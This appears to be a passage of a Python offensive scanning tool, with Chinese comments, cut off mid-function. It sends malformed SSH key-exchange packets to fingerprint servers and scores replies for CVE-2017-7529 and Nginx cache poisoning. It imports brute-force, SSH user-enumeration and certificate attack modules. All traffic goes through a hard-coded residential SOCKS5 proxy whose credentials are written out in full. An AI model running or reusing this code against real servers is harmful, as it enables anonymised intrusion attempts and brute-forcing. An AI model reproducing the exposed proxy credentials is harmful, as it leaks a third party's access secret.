#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE implemented by mathematics and physics, no scams, all knowledge!
(Proxy-enabled version)
"""

PROXY_ENABLED = True  #False禁用代理使用直连
PROXY_URL = "socks5://novada296TteLUNz_K0fuUk-zone-resi-region-vn-asn-AS7552:Hx3ZWOhIon5t@0c05ed992a26c3f0.lsv.as.novada.pro:7777"

# Global runtime controls with thread-safe access
import threading
_config_lock = threading.Lock()
_config = {
    'VERBOSE': False,             # Print debug logs when True
    'DIRECT_TLS_POLICY': "auto",  # one of: auto | never | always
    'DEFAULT_RETRIES': 0          # transient error retries per probe
}

# Thread-safe accessors
def get_verbose():
    with _config_lock:
        return _config['VERBOSE']

def get_direct_tls_policy():
    with _config_lock:
        return _config['DIRECT_TLS_POLICY']

def get_default_retries():
    with _config_lock:
        return _config['DEFAULT_RETRIES']

def set_config(verbose=None, direct_tls_policy=None, default_retries=None):
    with _config_lock:
        if verbose is not None:
            _config['VERBOSE'] = verbose
        if direct_tls_policy is not None:
            _config['DIRECT_TLS_POLICY'] = direct_tls_policy
        if default_retries is not None:
            _config['DEFAULT_RETRIES'] = default_retries

# Compatibility aliases for existing code
VERBOSE = property(get_verbose)
DIRECT_TLS_POLICY = property(get_direct_tls_policy)
DEFAULT_RETRIES = property(get_default_retries)



import argparse
import ipaddress
import os
import random
import socket
import struct
import sys
import time
import hashlib
import csv
import asyncio
import statistics
import math

try:
    from python_socks.async_.asyncio import Proxy
    from python_socks import ProxyType, ProxyError, ProxyConnectionError, ProxyTimeoutError
    PROXY_AVAILABLE = True
except ImportError:
    print("[!] 代理库未安装，请运行: pip install \"python-socks[asyncio]\"")
    sys.exit(1)

# --- logging & error classification helpers ---

def log_debug(msg: str):
    if VERBOSE:
        print(msg)

import ssl
import errno

def classify_exception(e: Exception) -> str:
    """Return a normalized status string for exceptions."""
    et = type(e)
    name = et.__name__
    # asyncio timeouts
    if isinstance(e, asyncio.TimeoutError):
        return "[timeout] operation timed out"
    # socket timeouts
    if isinstance(e, socket.timeout):
        return "[timeout] socket timeout"
    # connection refused
    if isinstance(e, ConnectionRefusedError):
        return "[refused] connection refused"
    # DNS errors
    if isinstance(e, socket.gaierror):
        return f"[dns] {e}"
    # Rate limit hints from generic exceptions
    es = str(e)
    if "429" in es or "Too Many Requests" in es:
        return f"[rate-limit] {e}"
    # Authentication hints
    if "auth" in es.lower() and ("fail" in es.lower() or "denied" in es.lower()):
        return f"[auth-failed] {e}"
    # TLS/SSL
    if isinstance(e, ssl.SSLError):
        return f"[tls-error] {e}"
    # Proxy-specific
    try:
        if isinstance(e, ProxyTimeoutError):
            return "[proxy-timeout] proxy operation timed out"
    except NameError:
        pass
    try:
        if isinstance(e, ProxyConnectionError):
            return f"[proxy-conn] {e}"
    except NameError:
        pass
    try:
        if isinstance(e, ProxyError):
            return f"[proxy-error] {e}"
    except NameError:
        pass
    # ECONNRESET, ENETUNREACH, etc.
    if isinstance(e, OSError) and hasattr(e, 'errno'):
        if e.errno in (errno.ECONNRESET, errno.EHOSTUNREACH, errno.ENETUNREACH):
            return f"[network] {name}: {e.strerror or e}"
    # fallback
    return f"[exc] {name}: {e}"


def is_transient_error(e: Exception) -> bool:
    """Errors worth retrying once or twice."""
    error_types = [asyncio.TimeoutError, socket.timeout, ConnectionResetError]
    try:
        error_types.append(ProxyTimeoutError)
    except NameError:
        pass
    return isinstance(e, tuple(error_types))


def get_retry_delay(attempt: int, error_type: str) -> float:
    """Return backoff delay based on error classification string."""
    try:
        if "[timeout]" in error_type:
            return 0.1 * (2 ** attempt)  # exponential backoff
        if "[rate-limit]" in error_type:
            return 1.0 * attempt  # linear backoff
        return 0.05 * attempt  # quick retry for others
    except Exception:
        return 0.05 * attempt

async def open_connection(proxy_url, host, port, ssl_context=None, server_hostname=None):
    """通过代理建立连接，返回(reader, writer)
    如果提供 ssl_context，则在代理连接上直接建立 TLS。
    """
    proxy = Proxy.from_url(proxy_url)
    sock = await proxy.connect(dest_host=host, dest_port=port)
    
    loop = asyncio.get_event_loop()
    reader = asyncio.StreamReader()
    protocol = asyncio.StreamReaderProtocol(reader)
    
    # 用已连接的socket创建transport，可选启用TLS
    transport, _ = await loop.create_connection(
        lambda: protocol,
        sock=sock,
        ssl=ssl_context if ssl_context is not None else None,
        server_hostname=server_hostname if ssl_context is not None else None,
    )
    
    writer = asyncio.StreamWriter(transport, protocol, reader, loop)
    return reader, writer

async def smart_open_connection(proxy_url, host, port, force_direct_tls=False, timeout=2.0):
    """
    智能连接：TLS指纹检测可直连，其他走代理；根据策略减少噪音。
    force_direct_tls: 历史参数，保留兼容。由 DIRECT_TLS_POLICY 控制。
    """
    log_debug(f"[DEBUG] Smart连接: host={host}, port={port}, force_direct_tls={force_direct_tls}, policy={DIRECT_TLS_POLICY}")

    # 仅对 443 端口考虑直连
    allow_direct = (port == 443)

    # 解析策略
    policy = DIRECT_TLS_POLICY or ("always" if force_direct_tls else "auto")

    # 在启用代理的情况下，auto 策略默认不直连，避免内网/防火墙噪音
    try_direct = False
    if allow_direct:
        if policy == "always":
            try_direct = True
        elif policy == "never":
            try_direct = False
        else:  # auto
            try_direct = not PROXY_ENABLED

    if try_direct:
        log_debug(f"[TLS] 尝试直连获取准确指纹: {host}:{port}")
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
            log_debug(f"[TLS]  直连成功！使用原始TLS指纹")
            return reader, writer
        except Exception as e:
            log_debug(f"[TLS]  直连失败({classify_exception(e)})，切换代理模式")

    # 默认或失败后使用代理
    log_debug(f"[PROXY] 使用代理连接: {host}:{port}")
    return await open_connection(proxy_url, host, port)

# 错误页技术栈分析和缓存投毒检测函数

def analyze_error_page_tech_stack(response_body, status_line):
    """分析错误页面识别技术栈"""
    tech_stack = []
    confidence = 0
    
    # 检查响应体和状态行中的技术特征
    indicators = {
        'PHP': ['php', 'fatal error', 'parse error', 'php warning', 'call stack', '/var/www'],
        'Java': ['tomcat', 'jetty', 'java.lang', 'javax.servlet', 'spring', 'stacktrace'],
        'Python': ['django', 'flask', 'python', 'traceback', 'wsgi', 'site-packages'],
        'NodeJS': ['express', 'node.js', 'javascript', 'v8 engine', 'node_modules'],
        'ASP.NET': ['asp.net', 'microsoft', 'iis', 'system.web', '.net framework'],
        'Ruby': ['ruby', 'rails', 'gem', 'bundler', 'passenger'],
        'Go': ['go runtime', 'goroutine', 'golang'],
        'Nginx': ['nginx', 'openresty', 'tengine']
    }
    
    response_lower = response_body.lower()
    status_lower = status_line.lower()
    
    for tech, patterns in indicators.items():
        matches = sum(1 for pattern in patterns if pattern in response_lower or pattern in status_lower)
        if matches > 0:
            tech_stack.append(f"{tech}({matches})")
            confidence += matches
    
    if tech_stack:
        return f"TechStack: {','.join(tech_stack[:3])} | Confidence: {min(confidence, 10)}/10"
    else:
        return "Generic: Unknown backend"

def analyze_cache_poisoning_response(response_body, headers, location):
    """分析缓存投毒响应"""
    poison_indicators = []
    
    # 检查响应头中的缓存投毒证据
    for header in headers:
        header_lower = header.lower()
        if 'host:' in header_lower and 'evil.' in header_lower:
            poison_indicators.append('Host-Reflected')
        if any(cache in header_lower for cache in ['x-cache', 'cache-control']):
            if 'hit' in header_lower:
                poison_indicators.append('Cache-Hit')
    
    # 检查响应体中的Host反射
    if 'evil.' in response_body.lower():
        poison_indicators.append('Host-In-Body')
    
    # 分析缓存投毒潜力
    poison_potential = "HIGH" if len(poison_indicators) >= 2 else "LOW" if poison_indicators else "NONE"
    
    if poison_indicators:
        return f"CachePoison: {poison_potential} | Evidence: {','.join(poison_indicators[:3])}"
    else:
        return "CachePoison: NONE"

def analyze_cve_2017_7529_response(status, response_body, took):
    """分析CVE-2017-7529整数溢出漏洞响应"""
    # CVE-2017-7529: Nginx 1.12.2 及之前版本的整数溢出漏洞
    vulnerability_indicators = []
    
    # 检查异常响应时间（可能因为内存分配导致延迟）
    if took > 5000:  # 超过5秒
        vulnerability_indicators.append(f"SlowResponse({took}ms)")
    
    # 检查状态码异常
    if "500" in status or "502" in status or "503" in status:
        vulnerability_indicators.append("ServerError")
    elif "206" in status:  # Partial Content - 可能处理了超大范围
        vulnerability_indicators.append("PartialContent-Processed")
    elif "416" in status:  # Range Not Satisfiable - 正常防护
        vulnerability_indicators.append("RangeRejected-Protected")
    
    # 检查响应体中的内存错误指标
    response_lower = response_body.lower()
    if any(indicator in response_lower for indicator in [
        'memory', 'allocation', 'overflow', 'segment', 'fault'
    ]):
        vulnerability_indicators.append("MemoryError")
    
    # 漏洞评估
    if "PartialContent-Processed" in vulnerability_indicators:
        risk_level = "CRITICAL"
    elif len(vulnerability_indicators) >= 2:
        risk_level = "HIGH"
    elif vulnerability_indicators:
        risk_level = "MEDIUM"
    else:
        risk_level = "PROTECTED"
    
    if vulnerability_indicators:
        return f"CVE-2017-7529: {risk_level} | Evidence: {','.join(vulnerability_indicators[:3])}"
    else:
        return "CVE-2017-7529: PROTECTED | Integer overflow mitigated"

def analyze_nginx_cache_poison_1_12_2(response_body, headers, location):
    """分析Nginx 1.12.2特定的缓存投毒漏洞"""
    # 针对Nginx 1.12.2反向代理配置的特定缓存投毒向量
    poison_evidence = []
    
    # 检查X-Original-URL头的处理
    for header in headers:
        header_lower = header.lower()
        
        # 检查X-Original-URL是否被反射到Location头
        if 'location:' in header_lower and '/admin' in header_lower:
            poison_evidence.append("OriginalURL-Reflected")
        
        # 检查缓存键污染证据
        if 'x-cache-key:' in header_lower and 'evil.' in header_lower:
            poison_evidence.append("CacheKey-Poisoned")
        
        # 检查Vary头异常
        if 'vary:' in header_lower and 'host' not in header_lower:
            poison_evidence.append("Vary-Missing-Host")
    
    # 检查响应体中的Host头反射（1.12.2特有的反射位置）
    response_lower = response_body.lower()
    if 'evil.' in response_lower:
        if '<script' in response_lower:
            poison_evidence.append("XSS-via-Host")
        elif 'src=' in response_lower or 'href=' in response_lower:
            poison_evidence.append("ResourcePath-Poisoned")
        else:
            poison_evidence.append("Host-Reflected-Body")
    
    # 1.12.2特定的缓存投毒风险评估
    if "OriginalURL-Reflected" in poison_evidence or "XSS-via-Host" in poison_evidence:
        risk_level = "CRITICAL"
    elif len(poison_evidence) >= 2:
        risk_level = "HIGH" 
    elif poison_evidence:
        risk_level = "MEDIUM"
    else:
        risk_level = "SECURE"
    
    if poison_evidence:
        return f"CachePoison-1.12.2: {risk_level} | Evidence: {','.join(poison_evidence[:3])}"
    else:
        return "CachePoison-1.12.2: SECURE | No 1.12.2 specific poisoning detected"

def analyze_http2_range_overflow(status, response_body, took):
    """分析HTTP/2 Range请求溢出漏洞"""
    # 针对Nginx 1.12.2的HTTP/2 Range处理缺陷
    overflow_indicators = []
    
    # 检查响应时间异常（内存分配/解析延迟）
    if took > 3000:
        overflow_indicators.append(f"ProcessingDelay({took}ms)")
    
    # 检查HTTP/2特定的错误响应
    if "400" in status and "Bad Request" in status:
        overflow_indicators.append("BadRequest-LargeRange")
    elif "413" in status:  # Request Entity Too Large
        overflow_indicators.append("EntityTooLarge")
    elif "414" in status:  # URI Too Long  
        overflow_indicators.append("URITooLong")
    
    # 检查内存/解析相关错误
    response_lower = response_body.lower()
    if any(error in response_lower for error in [
        'request too large', 'header too large', 'invalid range',
        'parse error', 'buffer overflow'
    ]):
        overflow_indicators.append("ParseError")
    
    # 检查是否成功处理了异常大的Range（这表明可能存在漏洞）
    if "206" in status:  # Partial Content
        overflow_indicators.append("VULNERABLE-ProcessedLargeRange")
    
    # 漏洞风险评估
    if "VULNERABLE-ProcessedLargeRange" in overflow_indicators:
        risk_level = "CRITICAL"
    elif len(overflow_indicators) >= 2:
        risk_level = "MEDIUM"
    elif overflow_indicators:
        risk_level = "LOW"
    else:
        risk_level = "SECURE"
    
    if overflow_indicators:
        return f"HTTP2-Range-Overflow: {risk_level} | Evidence: {','.join(overflow_indicators[:3])}"
    else:
        return "HTTP2-Range-Overflow: SECURE | Range processing appears safe"

# 导入开窗模块
try:
    from time_mch import first_door_attack, cve_2018_15473_enum, optimized_bruteforce
except ImportError:
    try:
        from .time_mch import first_door_attack, cve_2018_15473_enum, optimized_bruteforce
    except ImportError:
        print("[!] Warning: time_mch module not found, --first-door functionality disabled")

# 导入唐氏证书模块
try:
    from cert_sociology import CertRebelAttacks
except ImportError:
    try:
        from .cert_sociology import CertRebelAttacks
    except ImportError:
        print("[!] Warning: cert_sociology module not found, --cert-attacks functionality disabled")

# 导入云原生架构分析模块
try:
    from nginx_dos_analyzer import NginxDoSAnalyzer
except ImportError:
    try:
        from .nginx_dos_analyzer import NginxDoSAnalyzer
    except ImportError:
        NginxDoSAnalyzer = None
        print("[!] Warning: nginx_dos_analyzer module not found, cloud-native functionality disabled")

try:
    from xds_protocol_analyzer import XDSProtocolAnalyzer
except ImportError:
    try:
        from .xds_protocol_analyzer import XDSProtocolAnalyzer
    except ImportError:
        XDSProtocolAnalyzer = None
        print("[!] Warning: xds_protocol_analyzer module not found, xDS analysis functionality disabled")

try:
    from wasm_runtime_analyzer import WasmRuntimeAnalyzer
except ImportError:
    try:
        from .wasm_runtime_analyzer import WasmRuntimeAnalyzer
    except ImportError:
        WasmRuntimeAnalyzer = None
        print("[!] Warning: wasm_runtime_analyzer module not found, Wasm security analysis functionality disabled")

# OCSP validation is now integrated into cert_sociology.py CertRebelAttacks class


def is_private_or_local(host: str) -> bool:
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback
    except ValueError:
        try:
            ip = ipaddress.ip_address(socket.gethostbyname(host))
            return ip.is_private or ip.is_loopback
        except Exception:
            return False

def sha1s(b: bytes) -> str:
    return hashlib.sha1(b).hexdigest()

def md5s(b: bytes) -> str:
    return hashlib.md5(b).hexdigest()

def calculate_stats(times):
    """计算去除最高最低值后的统计特征"""
    if len(times) < 3:
        return times[0] if times else 0, 0, 0
    
    sorted_times = sorted(times)
    # 去除最高和最低值
    trimmed = sorted_times[1:-1]
    
    mean_val = statistics.mean(trimmed)
    median_val = statistics.median(trimmed)
    std_val = statistics.stdev(trimmed) if len(trimmed) > 1 else 0
    
    return round(mean_val, 2), round(median_val, 2), round(std_val, 2)

def calculate_entropy(data_list):
    """计算信息熵"""
    if not data_list:
        return 0
    
    # 所有响应转换为字符串并计算频率
    str_data = [str(item) for item in data_list]
    freq_map = {}
    for item in str_data:
        freq_map[item] = freq_map.get(item, 0) + 1
    
    total = len(str_data)
    entropy = 0
    for count in freq_map.values():
        p = count / total
        if p > 0:
            entropy -= p * math.log2(p)
    
    return round(entropy, 3)

def levenshtein_distance(s1, s2):
    """计算编辑距离"""
    if len(s1) < len(s2):
        return levenshtein_distance(s2, s1)
    
    if len(s2) == 0:
        return len(s1)
    
    previous_row = list(range(len(s2) + 1))
    for i, c1 in enumerate(s1):
        current_row = [i + 1]
        for j, c2 in enumerate(s2):
            insertions = previous_row[j + 1] + 1
            deletions = current_row[j] + 1
            substitutions = previous_row[j] + (c1 != c2)
            current_row.append(min(insertions, deletions, substitutions))
        previous_row = current_row
    
    return previous_row[-1]

def jaccard_similarity(set1, set2):
    """计算杰卡德相似系数"""
    if not set1 and not set2:
        return 1.0
    
    intersection = len(set1.intersection(set2))
    union = len(set1.union(set2))
    
    return intersection / union if union > 0 else 0

def print_table(rows, headers):
    colw = [max(len(h), *(len(str(r[i])) for r in rows)) for i, h in enumerate(headers)]
    fmt = " | ".join("{:%d}" % w for w in colw)
    sep = "-+-".join("-"*w for w in colw)
    print(fmt.format(*headers))
    print(sep)
    for r in rows:
        print(fmt.format(*[str(x) for x in r]))

#SSH module
SSH_MSG_DISCONNECT = 1
SSH_MSG_KEXINIT    = 20

REASON_MAP = {
    1:  "HOST_NOT_ALLOWED",
    2:  "PROTOCOL_ERROR",
    3:  "KEX_FAILED",
    4:  "RESERVED",
    5:  "MAC_ERROR",
    6:  "COMP_ERROR",
    7:  "SERVICE_NA",
    8:  "PROTO_VER_UNSUPPORTED",
    9:  "HOSTKEY_NOT_VERIFIABLE",
    10: "CONNECTION_LOST",
    11: "BY_APPLICATION",
    12: "TOO_MANY_CONNECTIONS",
    13: "AUTH_CANCELLED",
    14: "NO_MORE_AUTH_METHODS",
    15: "ILLEGAL_USERNAME",
}

def ssh_string(b: bytes) -> bytes:
    return struct.pack(">I", len(b)) + b

def ssh_namelist(names) -> bytes:
    return ssh_string(",".join(names).encode("ascii"))

def build_kexinit_payload(kex_algos, hostkey_algos, ciphers, macs, compress, languages):
    rnd = random.Random(os.urandom(16))
    cookie = bytes([rnd.randrange(0, 256) for _ in range(16)])
    parts = [
        bytes([SSH_MSG_KEXINIT]),
        cookie,
        ssh_namelist(kex_algos),
        ssh_namelist(hostkey_algos),
        ssh_namelist(ciphers),   # c2s
        ssh_namelist(ciphers),   # s2c
        ssh_namelist(macs),      # c2s
        ssh_namelist(macs),      # s2c
        ssh_namelist(compress),  # c2s
        ssh_namelist(compress),  # s2c
        ssh_namelist(languages),
        ssh_namelist(languages),
        b"\x00",                 # first_kex_packet_follows = FALSE
        b"\x00\x00\x00\x00",     # reserved
    ]
    payload = b"".join(parts)
    block = 8; min_pad = 4
    pad_len = min_pad
    while ((len(payload) + 1 + pad_len) % block) != 0:
        pad_len += 1
    padding = os.urandom(pad_len)
    pkt_len = len(payload) + 1 + pad_len
    return struct.pack(">I", pkt_len) + bytes([pad_len]) + payload + padding

def ssh_read_line(sock, timeout=5.0):
    sock.settimeout(timeout)
    buf = b""
    while True:
        ch = sock.recv(1)
        if not ch:
            break
        buf += ch
        if ch == b"\n" or len(buf) > 512:
            break
    return buf

def ssh_read_packet(sock, timeout=5.0):
    sock.settimeout(timeout)
    hdr = b""
    while len(hdr) < 5:
        chunk = sock.recv(5 - len(hdr))
        if not chunk:
            return b""
        hdr += chunk
    pkt_len = struct.unpack(">I", hdr[:4])[0]
    pad_len = hdr[4]
    rest = b""
    need = pkt_len - 1
    while len(rest) < need:
        chunk = sock.recv(need - len(rest))
        if not chunk:
            break
        rest += chunk
    if len(rest) < need or pad_len > len(rest):
        return b""
    return rest[:-pad_len]

def parse_disconnect(payload: bytes):
    if not payload or payload[0] != SSH_MSG_DISCONNECT:
        return None
    off = 1
    if len(payload) < off + 4: return None
    reason = struct.unpack(">I", payload[off:off+4])[0]; off += 4
    if len(payload) < off + 4: return (reason,"","")
    l = struct.pack(">I",0)
    l = struct.unpack(">I", payload[off:off+4])[0]; off += 4
    desc = payload[off:off+l].decode("utf-8", errors="replace"); off += l
    if len(payload) < off + 4: return (reason, desc, "")
    l2 = struct.unpack(">I", payload[off:off+4])[0]; off += 4
    lang = payload[off:off+l2].decode("ascii", errors="replace")
    return (reason, desc, lang)

SSH_TEMPLATES = [
    ("modern-mismatch",
     ["curve25519-sha256@libssh.org","sntrup761x25519-sha512@openssh.com","weird-kex@invalid"],
     ["rsa-sha2-512","rsa-sha2-256","ssh-ed25519"],
     ["chacha20-poly1305@openssh.com","aes256-gcm@openssh.com"],
     ["hmac-sha2-512-etm@openssh.com","umac-128-etm@openssh.com"],
     ["zlib@openssh.com","none"],
     []),
    ("legacy-heavy",
     ["diffie-hellman-group1-sha1","diffie-hellman-group14-sha1"],
     ["ssh-dss","ssh-rsa"],
     ["aes256-cbc","3des-cbc"],
     ["hmac-md5","hmac-sha1"],
     ["none"],
     []),
    ("nonsense-only",
     ["invalid-kex@x","unknown-kex"],
     ["bad-hostkey@x"],
     ["rc4","null"],
     ["bad-mac"],
     ["weird-compress"],
     []),
    ("minimal-curve",
     ["curve25519-sha256@libssh.org"],
     ["ssh-ed25519"],
     ["aes128-ctr"],
     ["hmac-sha2-256"],
     ["none"],
     []),
]

def run_ssh_fp_multi_ports(host, timeout=5.0):
    """尝试多个SSH端口进行指纹检测，优先22000然后22"""
    ssh_ports = [22000, 22]
    
    for port in ssh_ports:
        try:
            # 先快速检测端口是否为SSH服务
            with socket.create_connection((host, port), timeout=min(2.0, timeout)) as s:
                s.settimeout(1.0)
                first_line = ssh_read_line(s, timeout=1.0)
                if first_line and first_line.startswith(b"SSH-"):
                    # 找到SSH服务，使用这个端口进行完整指纹检测
                    return run_ssh_fp(host, port, timeout)
        except Exception:
            continue
    
    # 如果都没找到SSH服务，返回空结果
    return [["no_ssh_service", "No SSH service found on ports", "no", f"FAILED on ports {ssh_ports}", 0, "", 0]]

def run_ssh_fp(host, port, timeout=5.0):
    rows = []
    
    # 首先检测端口是否真的是SSH服务
    log_debug(f"[DEBUG] Checking if port {port} is SSH service...")
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(1.0)  # 快速检测
            # 尝试读取第一行，SSH服务器应该返回SSH版本信息
            first_line = ssh_read_line(s, timeout=1.0)
            if first_line:
                if first_line.startswith(b"SSH-"):
                    log_debug(f"[DEBUG] Confirmed SSH service on port {port}")
                elif first_line.startswith(b"HTTP/") or b"Content-Type:" in first_line:
                    log_debug(f"[WARNING] Port {port} appears to be HTTP service, not SSH")
                    log_debug(f"[DEBUG] Received: {first_line[:100].decode('ascii', errors='replace')}")
                    # 为所有模板返回错误结果
                    for name, kex, hka, ciph, macs, comp, langs in SSH_TEMPLATES:
                        rows.append([name, "HTTP Service Detected", "no", "PROTOCOL_ERROR", 0, "", 0])
                    return rows
                else:
                    log_debug(f"[WARNING] Unknown protocol on port {port}: {first_line[:50]}")
    except Exception as e:
        log_debug(f"[DEBUG] Port {port} protocol detection failed: {classify_exception(e)}")
    
    # 继续正常的SSH指纹探测
    for name, kex, hka, ciph, macs, comp, langs in SSH_TEMPLATES:
        start = time.time()
        server_id = ""
        kexinit_seen = False
        reason = None; desc = ""; lang = ""
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.settimeout(timeout)
                my_id = b"SSH-2.0-EchoDiffFP_0.2\r\n"
                sid = ssh_read_line(s, timeout=timeout)
                if not sid or not sid.startswith(b"SSH-"):
                    s.sendall(my_id)
                    sid = ssh_read_line(s, timeout=timeout)
                else:
                    s.sendall(my_id)
                    
                if sid and sid.startswith(b"SSH-"):
                    server_id = sid.strip().decode("ascii", errors="replace")
                    print(f"[DEBUG] SSH server identified: {server_id}")
                    pkt = build_kexinit_payload(kex, hka, ciph, macs, comp, langs)
                    s.sendall(pkt)
                    for i in range(3):
                        payload = ssh_read_packet(s, timeout=timeout)
                        if not payload: break
                        if payload[0] == SSH_MSG_KEXINIT:
                            kexinit_seen = True; continue
                        if payload[0] == SSH_MSG_DISCONNECT:
                            reason, desc, lang = parse_disconnect(payload); break
                else:
                    # 不是SSH协议
                    server_id = "Non-SSH Service"
                    desc = f"Protocol mismatch: {sid[:50] if sid else 'No response'}"
                    
        except Exception as e:
            desc = classify_exception(e)
            log_debug(f"[DEBUG] SSH probe error: {desc}")
        
        elapsed = int((time.time()-start)*1000)
        rname = REASON_MAP.get(reason, f"UNK({reason})") if reason is not None else "NO_REPLY"
        dlen = len(desc.encode("utf-8", errors="ignore"))
        dhash = sha1s(desc.encode("utf-8", errors="ignore")) if desc else ""
        rows.append([name, server_id, "yes" if kexinit_seen else "no", rname, dlen, dhash[:12], elapsed])
    return rows

async def ssh_probe_single(host, port, template, timeout=5.0):
    """单次SSH探测"""
    name, kex, hka, ciph, macs, comp, langs = template
    start = time.time()
    server_id = ""
    kexinit_seen = False
    reason = None; desc = ""; lang = ""

    attempts = (DEFAULT_RETRIES or 0) + 1
    for attempt in range(1, attempts + 1):
        try:
            # *** MODIFIED FOR PROXY ***
            if PROXY_ENABLED:
                reader, writer = await asyncio.wait_for(
                    open_connection(proxy_url=PROXY_URL, host=host, port=port), 
                    timeout=timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=timeout
                )
            
            my_id = b"SSH-2.0-EchoDiffFP_0.2\r\n"
            sid = await asyncio.wait_for(reader.readline(), timeout=timeout)
            
            # 协议识别并区分代理错误
            if sid:
                if sid.startswith(b"HTTP/") or b"Content-Type:" in sid:
                    if PROXY_ENABLED:
                        # 检查是否是代理错误（通常包含特定状态码）
                        sid_str = sid[:200].decode('ascii', errors='replace')
                        if any(code in sid_str for code in ['407', '401', '403', '502', '503']):
                            log_debug(f"[SSH] Proxy authentication/connection error on port {port}: {sid_str[:100]}")
                            server_id = "Proxy Error"
                            desc = f"[proxy-error] {sid_str.split()[1] if len(sid_str.split()) > 1 else 'Unknown'}"
                        else:
                            # 可能是目标端口真的是HTTP服务，继续探测
                            log_debug(f"[SSH] Ambiguous response on port {port}, could be HTTP service or proxy issue")
                            server_id = "Protocol Ambiguous"
                            desc = "[protocol-unclear] HTTP response via proxy"
                    else:
                        log_debug(f"[SSH] Port {port} is HTTP service, not SSH: {sid[:100].decode('ascii', errors='replace')}")
                        server_id = "HTTP Service Detected"
                        desc = f"Protocol mismatch: HTTP service on SSH port"
                    writer.close()
                    await writer.wait_closed()
                    elapsed = int((time.time()-start)*1000)
                    return [name, server_id, "no", "PROTOCOL_ERROR", len(desc), sha1s(desc.encode()), elapsed]
            
            if not sid or not sid.startswith(b"SSH-"):
                writer.write(my_id)
                await writer.drain()
                sid = await asyncio.wait_for(reader.readline(), timeout=timeout)
            else:
                writer.write(my_id)
                await writer.drain()
                
            if sid and sid.startswith(b"SSH-"):
                server_id = sid.strip().decode("ascii", errors="replace")
                log_debug(f"[DEBUG] SSH server identified (async): {server_id}")
            else:
                # 不是SSH协议
                server_id = "Non-SSH Service"
                desc = f"Protocol mismatch: {sid[:50].decode('ascii', errors='replace') if sid else 'No response'}"
                writer.close()
                await writer.wait_closed()
                elapsed = int((time.time()-start)*1000)
                return [name, server_id, "no", "PROTOCOL_ERROR", len(desc), sha1s(desc.encode()), elapsed]
            pkt = build_kexinit_payload(kex, hka, ciph, macs, comp, langs)
            writer.write(pkt)
            await writer.drain()
            
            for i in range(3):
                try:
                    hdr = await asyncio.wait_for(reader.read(5), timeout=timeout)
                    if len(hdr) < 5:
                        break
                    pkt_len = struct.unpack(">I", hdr[:4])[0]
                    pad_len = hdr[4]
                    rest = await asyncio.wait_for(reader.read(pkt_len - 1), timeout=timeout)
                    if len(rest) < pkt_len - 1 or pad_len > len(rest):
                        break
                    payload = rest[:-pad_len]
                    
                    if payload and payload[0] == SSH_MSG_KEXINIT:
                        kexinit_seen = True
                        continue
                    if payload and payload[0] == SSH_MSG_DISCONNECT:
                        reason, desc, lang = parse_disconnect(payload)
                        break
                except asyncio.TimeoutError:
                    break
                    
            writer.close()
            await writer.wait_closed()
            # success
            break
            
        except Exception as e:
            desc = classify_exception(e)
            if attempt < attempts and is_transient_error(e):
                log_debug(f"[SSH] transient error, retrying ({attempt}/{attempts-1}): {desc}")
                await asyncio.sleep(get_retry_delay(attempt, desc))
                continue
            else:
                break
    
    elapsed = int((time.time()-start)*1000)
    rname = REASON_MAP.get(reason, f"UNK({reason})") if reason is not None else "NO_REPLY"
    dlen = len(desc.encode("utf-8", errors="ignore"))
    dhash = sha1s(desc.encode("utf-8", errors="ignore")) if desc else ""
    
    return [name, server_id, "yes" if kexinit_seen else "no", rname, dlen, dhash[:12], elapsed]

async def run_ssh_fp_async(host, port, timeout=5.0, samples=1):
    """异步SSH指纹识别"""
    all_results = []
    
    for _ in range(samples):
        tasks = [ssh_probe_single(host, port, template, timeout) for template in SSH_TEMPLATES]
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(batch_results):
            if isinstance(result, Exception):
                template_name = SSH_TEMPLATES[i][0]
                result = [template_name, "", "no", f"[exc] {result}", 0, "", 0]
            all_results.append(result)
    
    # 按模板名分组并计算统计信息
    template_groups = {}
    for result in all_results:
        template_name = result[0]
        if template_name not in template_groups:
            template_groups[template_name] = []
        template_groups[template_name].append(result)
    
    final_rows = []
    for template_name in [t[0] for t in SSH_TEMPLATES]:
        if template_name in template_groups:
            group = template_groups[template_name]
            times = [row[6] for row in group]  # ms字段
            mean_ms, median_ms, std_ms = calculate_stats(times)
            
            # 使用第一个结果作为基础，替换统计信息
            base_row = group[0].copy()
            base_row[6] = f"{mean_ms}±{std_ms}"
            
            # 计算该模板的信息熵
            responses = [f"{row[1]}|{row[3]}|{row[4]}" for row in group]  # server_id|reason|dlen
            entropy = calculate_entropy(responses)
            base_row.append(entropy)
            
            final_rows.append(base_row)
    
    return final_rows

# SSH时序依赖分析模块
async def ssh_temporal_probe(host, port, timeout=5.0):
    """SSH时序依赖分析：检测状态污染和并发处理能力"""
    
    # 测试模板：正常 → 异常 → 正常
    normal_template = ("normal-kex",
                      ["curve25519-sha256@libssh.org","diffie-hellman-group14-sha256"],
                      ["rsa-sha2-256","ssh-ed25519"],
                      ["aes256-ctr","aes128-ctr"],
                      ["hmac-sha2-256"],
                      ["none"],
                      [])
    
    poison_template = ("poison-kex",
                      ["invalid-kex-super-long-name-to-stress-parser@invalid.com","unknown-algorithm"],
                      ["bad-hostkey@invalid","fake-rsa"],
                      ["null-cipher","invalid-aes"],
                      ["bad-mac-algorithm"],
                      ["invalid-compression"],
                      [])
    
    results = []
    
    # 1. KEX状态污染测试
    try:
        # 第一次正常连接（基线）
        baseline_time = await ssh_single_kex_time(host, port, normal_template, timeout)
        
        # 发送异常KEX（污染状态）
        poison_time = await ssh_single_kex_time(host, port, poison_template, timeout)
        
        # 立即重发正常KEX（检测污染影响）
        recovery_time = await ssh_single_kex_time(host, port, normal_template, timeout)
        
        # 计算污染影响比率
        pollution_ratio = recovery_time / baseline_time if baseline_time > 0 else 0
        
        results.append([
            "state-pollution",
            f"baseline:{baseline_time}ms",
            f"recovery:{recovery_time}ms", 
            f"ratio:{pollution_ratio:.2f}",
            "",
            "",
            int(pollution_ratio * 1000)  # 放大便于统计
        ])
        
    except Exception as e:
        results.append(["state-pollution", f"[exc] {e}", "", "", "", "", 0])
    
